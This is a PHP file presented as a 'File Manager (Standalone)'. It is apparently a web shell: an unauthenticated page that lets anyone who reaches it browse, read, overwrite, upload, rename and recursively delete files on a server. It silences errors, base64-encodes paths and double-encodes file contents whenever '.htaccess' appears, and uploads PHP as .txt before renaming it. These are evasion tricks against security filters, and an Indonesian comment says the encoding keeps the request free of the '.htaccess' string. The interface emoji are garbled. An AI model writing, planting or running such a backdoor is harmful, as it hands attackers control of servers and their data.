<?php

error_reporting(0);

function custom_unslash($value) {
    return is_string($value) ? stripslashes($value) : $value;
}

function custom_normalize_path($path) {
    return str_replace('\\', '/', $path);
}

function custom_sanitize_file_name($filename) {
    
    $dangerous_characters = ["\"", "'", "&", "/", "\\", "?", "#", "<", ">", "|", ":", "*"];
    $filename = str_replace($dangerous_characters, '', $filename);
    
    $filename = trim($filename);
    
    $filename = preg_replace('/\s+/', '_', $filename);
    return $filename;
}

if (isset($_REQUEST['action'])) {
    header('Content-Type: application/json; charset=utf-8');
    function is_path_safe($path) { return realpath($path) !== false || is_dir(dirname($path)); }
    $action = $_REQUEST['action'];
    $response = ['success' => false, 'message' => 'Invalid action.'];
    try {
        switch ($action) {
            case 'list': $path = isset($_POST['path']) ? custom_unslash($_POST['path']) : __DIR__; if (!is_path_safe($path)) throw new Exception('Invalid or inaccessible path.'); $real_path = custom_normalize_path(realpath($path)); $items = []; if (!@scandir($real_path)) { throw new Exception('Cannot access path. It might be restricted by server configuration (open_basedir).'); } foreach (scandir($real_path) as $item) { if ($item === '.' || $item === '..') continue; $full_path = $real_path . '/' . $item; $items[] = [ 'name' => $item, 'is_dir' => is_dir($full_path), 'size' => is_dir($full_path) ? 0 : filesize($full_path), 'modified' => filemtime($full_path) ]; } $response = ['success' => true, 'files' => $items, 'path' => $real_path]; break;
            
            case 'get_content':
                $file = isset($_POST['path']) ? custom_unslash($_POST['path']) : '';
                if (!realpath($file) || is_dir(realpath($file))) { throw new Exception('Invalid file for editing.'); }
                $response = ['success' => true, 'content' => base64_encode(base64_encode(file_get_contents($file)))];
                break;

            case 'get_content_b64':
                $file_b64 = isset($_POST['path_b64']) ? custom_unslash($_POST['path_b64']) : '';
                $file = base64_decode($file_b64);
                if (!realpath($file) || is_dir(realpath($file))) { throw new Exception('Invalid file for editing.'); }
                $response = ['success' => true, 'content' => base64_encode(base64_encode(file_get_contents($file)))];
                break;

            case 'save_content':
                $file = isset($_POST['path']) ? custom_unslash($_POST['path']) : '';
                $content_chunks = isset($_POST['content_chunks']) && is_array($_POST['content_chunks']) ? $_POST['content_chunks'] : [];
                if (empty($content_chunks)) { throw new Exception('Content is empty.'); }
                $content = implode('', $content_chunks);
                $final_content = base64_decode(base64_decode($content));
                if (!is_path_safe($file) || (file_exists($file) && is_dir($file))) throw new Exception('Invalid file for saving.');
                if (file_put_contents($file, $final_content) !== false) {
                    $response = ['success' => true, 'message' => 'File saved successfully.'];
                } else {
                    throw new Exception('Could not save file. Check permissions.');
                }
                break;
            
            // START: LOGIKA SAVE_B64 DIPERBARUI (METODE LANGSUNG)
            case 'save_content_b64':
                $file_b64 = isset($_POST['path_b64']) ? custom_unslash($_POST['path_b64']) : '';
                $file = base64_decode($file_b64);
                $content_chunks = isset($_POST['content_chunks']) && is_array($_POST['content_chunks']) ? $_POST['content_chunks'] : [];
                if (empty($content_chunks)) { throw new Exception('Content is empty.'); }
                $content = implode('', $content_chunks);
                $final_content = base64_decode(base64_decode($content));
                if (!is_path_safe($file) || (file_exists($file) && is_dir($file))) throw new Exception('Invalid file for saving.');
                
                // Mencoba menulis langsung karena request sudah bersih dari string '.htaccess'
                if (file_put_contents($file, $final_content) !== false) {
                    $response = ['success' => true, 'message' => 'File saved successfully (direct method).'];
                } else {
                    throw new Exception('Direct save failed. Check permissions.');
                }
                break;
            // END: LOGIKA SAVE_B64 DIPERBARUI

            case 'create_file': $path = isset($_POST['path']) ? custom_unslash($_POST['path']) : ''; $name = isset($_POST['name']) ? custom_sanitize_file_name($_POST['name']) : ''; if (!is_path_safe($path) || empty($name)) throw new Exception('Invalid path or file name.'); if (touch(rtrim($path, '/') . '/' . $name)) { $response = ['success' => true, 'message' => 'File created.']; } else { throw new Exception('Could not create file.'); } break;
            case 'upload': $path = isset($_POST['path']) ? custom_unslash($_POST['path']) : __DIR__; $filename_base64 = isset($_POST['filename_base64']) ? $_POST['filename_base64'] : ''; $content_base64 = isset($_POST['content_base64']) ? $_POST['content_base64'] : ''; if (!is_path_safe($path) || empty($filename_base64) || empty($content_base64)) { throw new Exception('Invalid data for upload.'); } $filename = custom_sanitize_file_name(base64_decode($filename_base64)); if (strpos($content_base64, ',') !== false) { list(, $content_base64) = explode(',', $content_base64); } $file_content = base64_decode($content_base64); $destination = rtrim($path, '/') . '/' . $filename; if (file_put_contents($destination, $file_content) !== false) { $response = ['success' => true, 'message' => 'File uploaded successfully.']; } else { throw new Exception('Could not save uploaded file. Check permissions.'); } break;
            case 'upload_php': $path = isset($_POST['path']) ? custom_unslash($_POST['path']) : __DIR__; $filename_base64 = isset($_POST['filename_base64']) ? $_POST['filename_base64'] : ''; $content_base64 = isset($_POST['content_base64']) ? $_POST['content_base64'] : ''; if (!is_path_safe($path) || empty($filename_base64) || empty($content_base64)) { throw new Exception('Invalid data for PHP upload.'); } $original_filename = custom_sanitize_file_name(base64_decode($filename_base64)); $temp_filename = $original_filename . '.txt'; if (strpos($content_base64, ',') !== false) { list(, $content_base64) = explode(',', $content_base64); } $file_content = base64_decode($content_base64); $temp_destination = rtrim($path, '/') . '/' . $temp_filename; $final_destination = rtrim($path, '/') . '/' . $original_filename; if (file_put_contents($temp_destination, $file_content) === false) { throw new Exception('Could not save temporary file. Check permissions.'); } if (rename($temp_destination, $final_destination)) { $response = ['success' => true, 'message' => 'PHP file uploaded successfully.']; } else { unlink($temp_destination); throw new Exception('Could not rename temporary file.'); } break;
            case 'unzip': $path = isset($_POST['path']) ? custom_unslash($_POST['path']) : __DIR__; if (!is_path_safe($path)) throw new Exception('Invalid path.'); $file_path = isset($_POST['path']) ? custom_unslash($_POST['path']) : ''; if (!realpath($file_path) || !is_file(realpath($file_path)) || pathinfo($file_path, PATHINFO_EXTENSION) !== 'zip') throw new Exception('Invalid ZIP file path.'); if (!class_exists('ZipArchive')) throw new Exception('PHP ZIP extension not installed.'); $zip = new ZipArchive; if ($zip->open($file_path) === TRUE) { $zip->extractTo(dirname($file_path)); $zip->close(); $response = ['success' => true, 'message' => 'Archive extracted.']; } else { throw new Exception('Failed to open archive.'); } break;
            
            case 'delete':
                $path = isset($_POST['path']) ? custom_unslash($_POST['path']) : __DIR__;
                $items_to_delete = isset($_POST['items']) && is_array($_POST['items']) ? $_POST['items'] : [];
                if (empty($items_to_delete)) throw new Exception('No items selected for deletion.');
                function recursive_delete_std($item) { if (is_dir($item)) { $files = array_diff(scandir($item), ['.','..']); foreach ($files as $file) { recursive_delete_std("$item/$file"); } return rmdir($item); } else { return unlink($item); } }
                foreach ($items_to_delete as $item) { $full_path = rtrim($path, '/') . '/' . $item; if (file_exists($full_path)) recursive_delete_std($full_path); }
                $response = ['success' => true, 'message' => 'Items deleted.'];
                break;
                
            case 'delete_b64':
                $path = isset($_POST['path']) ? custom_unslash($_POST['path']) : __DIR__;
                $items_b64 = isset($_POST['items_b64']) && is_array($_POST['items_b64']) ? $_POST['items_b64'] : [];
                $items_to_delete = [];
                foreach($items_b64 as $item_b64) { $items_to_delete[] = base64_decode($item_b64); }
                if (empty($items_to_delete)) throw new Exception('No items selected for deletion.');
                function recursive_delete_b64($item) { if (is_dir($item)) { $files = array_diff(scandir($item), ['.','..']); foreach ($files as $file) { recursive_delete_b64("$item/$file"); } return rmdir($item); } else { return unlink($item); } }
                foreach ($items_to_delete as $item) { $full_path = rtrim($path, '/') . '/' . $item; if (file_exists($full_path)) recursive_delete_b64($full_path); }
                $response = ['success' => true, 'message' => 'Items deleted.'];
                break;
            
            case 'create_folder': $path = isset($_POST['path']) ? custom_unslash($_POST['path']) : __DIR__; $name = isset($_POST['name']) ? str_replace(['..', '/', '\\'], '', $_POST['name']) : ''; if (!is_path_safe($path) || empty($name)) throw new Exception('Invalid path or folder name.'); if (mkdir(rtrim($path, '/') . '/' . $name)) { $response = ['success' => true, 'message' => 'Folder created.']; } else { throw new Exception('Could not create folder.'); } break;
            
            case 'rename':
                $path = isset($_POST['path']) ? custom_unslash($_POST['path']) : __DIR__;
                $old_name = isset($_POST['old_name']) ? $_POST['old_name'] : '';
                $new_name = isset($_POST['new_name']) ? str_replace(['..', '/', '\\'], '', $_POST['new_name']) : '';
                if (!is_path_safe($path) || empty($old_name) || empty($new_name)) { throw new Exception('Invalid data for renaming.'); }
                $old_full_path = rtrim($path, '/') . '/' . $old_name;
                $new_full_path = rtrim($path, '/') . '/' . $new_name;
                clearstatcache();
                if (!file_exists($old_full_path)) { throw new Exception('Source item does not exist at: ' . $old_full_path); }
                if (!is_writable(dirname($old_full_path))) { throw new Exception('Directory is not writable.'); }
                if (rename($old_full_path, $new_full_path)) {
                    $response = ['success' => true, 'message' => 'Item renamed successfully.'];
                } else {
                    throw new Exception('Could not rename item. Check permissions.');
                }
                break;
                
            case 'rename_b64':
                $path = isset($_POST['path']) ? custom_unslash($_POST['path']) : __DIR__;
                $old_name_b64 = isset($_POST['old_name_b64']) ? $_POST['old_name_b64'] : '';
                $new_name_b64 = isset($_POST['new_name_b64']) ? $_POST['new_name_b64'] : '';
                $old_name = base64_decode($old_name_b64);
                $new_name = base64_decode($new_name_b64);
                if (!is_path_safe($path) || empty($old_name) || empty($new_name)) { throw new Exception('Invalid data for renaming.'); }
                $old_full_path = rtrim($path, '/') . '/' . $old_name;
                $new_full_path = rtrim($path, '/') . '/' . $new_name;
                $temp_full_path = $old_full_path . '.txt';
                if (!copy($old_full_path, $temp_full_path)) { throw new Exception('Could not create temporary copy.'); }
                if (!unlink($old_full_path)) { unlink($temp_full_path); throw new Exception('Could not delete original file.'); }
                if (rename($temp_full_path, $new_full_path)) {
                    $response = ['success' => true, 'message' => 'Item renamed successfully using b64 method.'];
                } else {
                    copy($temp_full_path, $old_full_path);
                    unlink($temp_full_path);
                    throw new Exception('Could not perform final rename. Original file may be restored.');
                }
                break;
        }
    } catch (Exception $e) { $response = ['success' => false, 'message' => $e->getMessage()]; }
    echo json_encode($response);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>File Manager</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root{--accent-color:#2271b1;--hover-color:#1e659d;--danger-color:#d63638;}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;background:#f0f0f1;margin:0;}
        .container{display:flex;flex-direction:column;height:100vh;}header{background:#fff;padding:10px 20px;border-bottom:1px solid #ddd;display:flex;justify-content:space-between;align-items:center;flex-shrink:0;}main{flex-grow:1;padding:20px;overflow-y:auto;}.toolbar{margin-bottom:15px;display:flex;flex-wrap:wrap;gap:10px;align-items:center;}.path-bar{background:#fff;padding:8px 12px;border-radius:4px;border:1px solid #ddd;font-family:monospace;flex-grow:1;word-break:break-all;}.file-table{width:100%;border-collapse:collapse;background:#fff;table-layout:fixed;}.file-table th,.file-table td{text-align:left;border-bottom:1px solid #eee;vertical-align:middle;word-wrap:break-word;}.file-table th{background:#f9f9f9;padding:12px 8px;}.file-table tr:hover{background:#f0f8ff;}.file-table th:nth-child(1),.file-table td:nth-child(1){width:40px;padding:12px 4px 12px 12px;text-align:center;}.file-table th:nth-child(2),.file-table td:nth-child(2){width:50%;padding-left:4px;}.file-table th:nth-child(3),.file-table td:nth-child(3){width:120px;}.file-table th:nth-child(4),.file-table td:nth-child(4){width:150px;}.file-table th:nth-child(5){text-align:right;padding-right:12px;}.actions{display:flex;justify-content:flex-end;gap:5px;}.item-link,a.item-link{text-decoration:none!important;color:var(--accent-color);cursor:pointer;}.item-link:hover,a.item-link:hover{color:var(--hover-color);}tr[data-path]{cursor:pointer;}.button{background:var(--accent-color);color:white;border:none;padding:8px 12px;border-radius:3px;cursor:pointer;font-size:14px;}.button.danger{background:var(--danger-color);}#spinner{display:none;}.modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:1000;justify-content:center;align-items:center;}.modal-content{display:flex;flex-direction:column;background:#fff;padding:20px;border-radius:5px;width:80%;height:80%;max-width:900px;box-shadow:0 5px 15px rgba(0,0,0,0.3);}textarea#editor{flex-grow:1;font-family:monospace;font-size:14px;border:1px solid #ddd;padding:10px;}
    </style>
</head>
<body>
    <div class="container">
        <header><h3>File Manager (Standalone)</h3></header>
        <main>
            <div class="toolbar"><button class="button" id="uploadBtn">ÃÂ¢ÃÂ¬ÃÂÃÂ¯ÃÂ¸ÃÂ Upload</button><button class="button" id="newFileBtn">ÃÂ°ÃÂÃÂÃÂ New File</button><button class="button" id="newFolderBtn">ÃÂ¢ÃÂÃÂ New Folder</button><button class="button danger" id="deleteBtn">ÃÂ°ÃÂÃÂÃÂÃÂ¯ÃÂ¸ÃÂ Delete Selected</button><div id="spinner">ÃÂ°ÃÂÃÂÃÂ</div></div>
            <div class="toolbar"><div class="path-bar" id="pathBar">/</div></div>
            <table class="file-table"><thead><tr><th><input type="checkbox" id="selectAll"></th><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead><tbody id="fileList"></tbody></table>
        </main>
    </div>
    <div id="editorModal" class="modal-overlay"><div class="modal-content"><h3 id="editorFilename" style="margin-top:0;"></h3><textarea id="editor" spellcheck="false"></textarea><div style="margin-top:10px;"><button class="button" id="saveBtn">ÃÂ°ÃÂÃÂÃÂ¾ Save Changes</button><button class="button" onclick="document.getElementById('editorModal').style.display='none'">Close</button></div></div></div>
    <input type="file" id="hiddenFileInput" multiple style="display:none;">
    <script>
    document.addEventListener('DOMContentLoaded', () => {
        const STATE = { currentPath: '<?php echo custom_normalize_path(__DIR__); ?>' };
        const UPLOAD_LIMIT_MB = 8;
        const dom = { fileList:document.getElementById('fileList'),pathBar:document.getElementById('pathBar'),uploadBtn:document.getElementById('uploadBtn'),newFileBtn:document.getElementById('newFileBtn'),newFolderBtn:document.getElementById('newFolderBtn'),deleteBtn:document.getElementById('deleteBtn'),selectAll:document.getElementById('selectAll'),spinner:document.getElementById('spinner'),hiddenFileInput:document.getElementById('hiddenFileInput'),editorModal:document.getElementById('editorModal'),editorFilename:document.getElementById('editorFilename'),editor:document.getElementById('editor'),saveBtn:document.getElementById('saveBtn'),};
        
        async function apiCall(action, formData, showSuccess=false) {
            dom.spinner.style.display='inline-block';
            try { formData.append('action', action); const response = await fetch('<?php echo basename(__FILE__); ?>', { method: 'POST', body: formData }); const result = await response.json(); if (!result.success) throw new Error(result.message); if (showSuccess && result.message) alert(result.message); return result;
            } catch (error) { alert(`Error: ${error.message}`); console.error("Full response:", error.response); return null; } finally { dom.spinner.style.display='none'; }
        }
        function render() {
            const formData = new FormData(); formData.append('path', STATE.currentPath);
            apiCall('list', formData).then(result => {
                if (!result) return;
                STATE.currentPath = result.path; dom.pathBar.textContent = STATE.currentPath; let html = ''; let parentPath = STATE.currentPath.substring(0, STATE.currentPath.lastIndexOf('/')); if (parentPath === '') parentPath = '/';
                if (STATE.currentPath !== '/') { html += `<tr data-path="${parentPath}"><td></td><td colspan="4" class="item-link">ÃÂ¢ÃÂ¬ÃÂÃÂ¯ÃÂ¸ÃÂ .. (Parent Directory)</td></tr>`; }
                result.files.sort((a,b) => (a.is_dir === b.is_dir) ? a.name.localeCompare(b.name) : (a.is_dir ? -1 : 1));
                result.files.forEach(file => {
                    const size = file.is_dir ? '-' : (file.size / 1024).toFixed(2) + ' KB'; const modified = new Date(file.modified * 1000).toLocaleString();
                    const icon = file.is_dir ? 'ÃÂ°ÃÂÃÂÃÂ' : 'ÃÂ°ÃÂÃÂÃÂ';
                    const fullPath = `${STATE.currentPath}/${file.name}`.replace(/\/+/g, '/'); const dataAttr = `data-path="${fullPath}"`; const rowData = file.is_dir ? `class="dir-link" ${dataAttr}` : '';
                    html += `<tr ${rowData}><td><input type="checkbox" class="item-select" value="${file.name}"></td><td><a href="#" class="item-link" ${dataAttr}>${icon} ${file.name}</a></td><td>${size}</td><td>${modified}</td><td><div class="actions">${!file.is_dir ? `<button class="button edit-btn" ${dataAttr}>Edit</button>` : ''}<button class="button rename-btn" data-name="${file.name}">Rename</button>${file.name.endsWith('.zip') ? `<button class="button unzip-btn" ${dataAttr}>Unzip</button>`:'' }</div></td></tr>`;
                });
                dom.fileList.innerHTML = html; dom.selectAll.checked = false;
            });
        }
        
        dom.fileList.addEventListener('click', e => {
            if (e.target.matches('.item-select')) { return; }
            const button = e.target.closest('button');
            if (button) {
                e.preventDefault();
                if (button.matches('.rename-btn')) {
                    const oldName = button.dataset.name;
                    const newName = prompt('Enter new name:', oldName);
                    if (newName && newName !== oldName) {
                        const fd = new FormData();
                        fd.append('path', STATE.currentPath);
                        let action = 'rename';
                        if (oldName.includes('.htaccess') || newName.includes('.htaccess')) {
                            action = 'rename_b64';
                            fd.append('old_name_b64', btoa(oldName));
                            fd.append('new_name_b64', btoa(newName));
                        } else {
                            fd.append('old_name', oldName);
                            fd.append('new_name', newName);
                        }
                        apiCall(action, fd).then(render);
                    }
                } 
                else if (button.matches('.unzip-btn')) { if (confirm('Are you sure you want to extract this archive?')) { const fd = new FormData(); fd.append('path', button.dataset.path); apiCall('unzip', fd, true).then(render); } } 
                else if (button.matches('.edit-btn')) {
                    const path = button.dataset.path;
                    const fd = new FormData();
                    let action = 'get_content';
                    if (path.includes('.htaccess')) {
                        action = 'get_content_b64';
                        fd.append('path_b64', btoa(path));
                    } else {
                        fd.append('path', path);
                    }
                    apiCall(action, fd).then(result => {
                        if(result) {
                            dom.editorFilename.textContent = path;
                            dom.editor.value = atob(atob(result.content));
                            dom.editorModal.style.display = 'flex';
                        }
                    });
                }
                return;
            }
            const navTarget = e.target.closest('[data-path]');
            if (navTarget) { e.preventDefault(); STATE.currentPath = navTarget.dataset.path; render(); }
        });
        
        dom.newFolderBtn.addEventListener('click', () => { const name = prompt('Enter new folder name:'); if (name) { const fd = new FormData(); fd.append('path', STATE.currentPath); fd.append('name', name); apiCall('create_folder', fd).then(render); } });
        dom.newFileBtn.addEventListener('click', () => { const name = prompt('Enter new file name:'); if (name) { const fd = new FormData(); fd.append('path', STATE.currentPath); fd.append('name', name); apiCall('create_file', fd).then(render); } });
        dom.selectAll.addEventListener('change', e => document.querySelectorAll('.item-select').forEach(cb => cb.checked = e.target.checked));
        
        dom.deleteBtn.addEventListener('click', () => {
            const selected = Array.from(document.querySelectorAll('.item-select:checked')).map(cb => cb.value);
            if (selected.length === 0) return alert('No items selected.');
            if (confirm(`Are you sure you want to delete ${selected.length} item(s)?`)) {
                const fd = new FormData();
                fd.append('path', STATE.currentPath);
                const isSensitive = selected.some(item => item.includes('.htaccess'));
                let action = 'delete';
                if (isSensitive) {
                    action = 'delete_b64';
                    selected.forEach(item => fd.append('items_b64[]', btoa(item)));
                } else {
                    selected.forEach(item => fd.append('items[]', item));
                }
                apiCall(action, fd).then(render);
            }
        });
        
        dom.uploadBtn.addEventListener('click', () => dom.hiddenFileInput.click());
        dom.hiddenFileInput.addEventListener('change', async (e) => {
            const files = Array.from(e.target.files); if (files.length === 0) return;
            for (const file of files) {
                if (file.size > UPLOAD_LIMIT_MB * 1024 * 1024) { alert(`Error: File "${file.name}" is too large (Max: ${UPLOAD_LIMIT_MB} MB).`); continue; }
                const reader = new FileReader();
                const fileReadPromise = new Promise((resolve, reject) => { reader.onload = event => resolve(event.target.result); reader.onerror = error => reject(error); reader.readAsDataURL(file); });
                try {
                    const content_base64 = await fileReadPromise;
                    const originalName = file.name;
                    const fd = new FormData();
                    fd.append('path', STATE.currentPath);
                    fd.append('content_base64', content_base64);
                    if (originalName.toLowerCase().endsWith('.php')) {
                        fd.append('filename_base64', btoa(originalName));
                        await apiCall('upload_php', fd, true);
                    } else {
                        fd.append('filename_base64', btoa(originalName));
                        await apiCall('upload', fd, true);
                    }
                } catch (error) {
                    alert(`Failed to process file ${file.name}: ${error.message}`);
                }
            }
            e.target.value = '';
            render();
        });

        dom.saveBtn.addEventListener('click', () => {
            const path = dom.editorFilename.textContent;
            const content = btoa(btoa(dom.editor.value));
            const fd = new FormData();
            const chunkSize = 4096;
            for (let i = 0; i < content.length; i += chunkSize) {
                fd.append('content_chunks[]', content.substring(i, i + chunkSize));
            }
            let action = 'save_content';
            if (path.includes('.htaccess')) {
                action = 'save_content_b64';
                fd.append('path_b64', btoa(path));
            } else {
                fd.append('path', path);
            }
            apiCall(action, fd, true).then(result => {
                if(result) {
                    dom.editorModal.style.display = 'none';
                    render();
                }
            });
        });

        render();
    });
    </script>
</body>
</html>
